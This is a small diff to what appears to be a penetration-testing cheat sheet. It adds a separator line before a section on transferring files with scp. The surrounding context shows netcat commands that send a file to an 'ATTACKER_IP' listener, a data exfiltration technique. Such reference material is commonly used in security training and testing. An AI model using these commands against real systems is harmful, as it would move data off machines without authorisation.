@@ -102,6 +102,7 @@ nc ATTACKER_IP ATTACKER_PORT < [file_to_download]
 nc -l ATTACKER_PORT > [output_file_path]
 ```
 
+---
 #### Transfer files using `scp`:
 
 ```
